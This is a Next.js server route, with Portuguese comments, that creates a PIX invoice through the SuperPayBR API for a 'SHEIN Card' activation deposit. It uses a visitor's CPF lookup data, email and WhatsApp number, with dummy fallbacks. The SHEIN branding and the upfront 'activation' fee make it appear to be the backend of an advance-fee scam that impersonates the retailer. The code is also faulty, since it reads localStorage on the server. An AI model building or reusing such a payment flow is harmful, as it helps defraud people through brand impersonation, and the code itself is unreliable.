import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("=== CRIANDO FATURA ATIVAÇÃO SUPERPAYBR ===")

    const body = await request.json()
    const { amount, description } = body

    // Carregar dados do usuário do localStorage via headers
    const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
    const userEmail = localStorage.getItem("userEmail") || ""
    const userWhatsApp = localStorage.getItem("userWhatsApp") || ""

    console.log("📋 Dados da fatura de ativação:", {
      amount,
      description,
      cliente: cpfData.nome,
    })

    // Primeiro, fazer autenticação
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`)
    const authResult = await authResponse.json()

    if (!authResult.success) {
      throw new Error("Falha na autenticação SuperPayBR")
    }

    const accessToken = authResult.data.access_token

    // Preparar dados da fatura de ativação SuperPayBR
    const invoiceData = {
      client: {
        name: cpfData.nome || "Cliente SHEIN",
        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
        email: userEmail || "cliente@shein.com",
        phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
        address: {
          street: "Rua Principal",
          number: "123",
          district: "Centro",
          city: "São Paulo",
          state: "SP",
          zipcode: "01000000",
          country: "BR",
        },
        ip: request.headers.get("x-forwarded-for") || "127.0.0.1",
      },
      payment: {
        id: `SHEIN_ATIVACAO_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        type: "3", // PIX
        due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
        referer: "SHEIN_ATIVACAO",
        installment: "1",
        order_url: `${request.nextUrl.origin}/upp/checkout`,
        store_url: request.nextUrl.origin,
        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
        discount: 0,
        products: [
          {
            id: "1",
            image: `${request.nextUrl.origin}/shein-card-logo-new.png`,
            title: description || "Depósito de Ativação - SHEIN Card",
            qnt: "1",
            discount: 0,
            amount: Number.parseFloat(amount.toString()),
          },
        ],
      },
      shipping: {
        amount: 0.0,
      },
    }

    console.log("🚀 Enviando fatura de ativação para SuperPayBR...")

    const createResponse = await fetch("https://api.superpaybr.com/v4/invoices", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${accessToken}`,
      },
      body: JSON.stringify(invoiceData),
    })

    console.log("📥 Resposta SuperPayBR Ativação:", {
      status: createResponse.status,
      statusText: createResponse.statusText,
      ok: createResponse.ok,
    })

    if (createResponse.ok) {
      const invoiceResult = await createResponse.json()
      console.log("✅ Fatura de ativação SuperPayBR criada com sucesso!")

      // Mapear resposta para formato esperado
      const mappedInvoice = {
        id: invoiceResult.fatura.id,
        invoice_id: invoiceResult.fatura.invoice_id,
        external_id: invoiceData.payment.id,
        pix: {
          payload: invoiceResult.fatura.pix.payload,
          image: invoiceResult.fatura.pix.image,
          qr_code: invoiceResult.fatura.pix.image,
        },
        status: {
          code: invoiceResult.fatura.status.code,
          title: invoiceResult.fatura.status.title,
          text: invoiceResult.fatura.status.text || "pending",
        },
        valores: {
          bruto: invoiceResult.fatura.valores.bruto,
          liquido: invoiceResult.fatura.valores.liquido,
        },
        vencimento: {
          dia: invoiceResult.fatura.vencimento.dia,
        },
        type: "real",
      }

      return NextResponse.json({
        success: true,
        data: mappedInvoice,
        raw_response: invoiceResult,
      })
    } else {
      const errorText = await createResponse.text()
      console.log("❌ Erro ao criar fatura de ativação SuperPayBR:", createResponse.status, errorText)

      return NextResponse.json(
        {
          success: false,
          error: `Erro SuperPayBR: ${createResponse.status} - ${errorText}`,
        },
        { status: createResponse.status },
      )
    }
  } catch (error) {
    console.log("❌ Erro ao criar fatura de ativação SuperPayBR:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Erro interno ao criar fatura de ativação SuperPayBR",
      },
      { status: 500 },
    )
  }
}
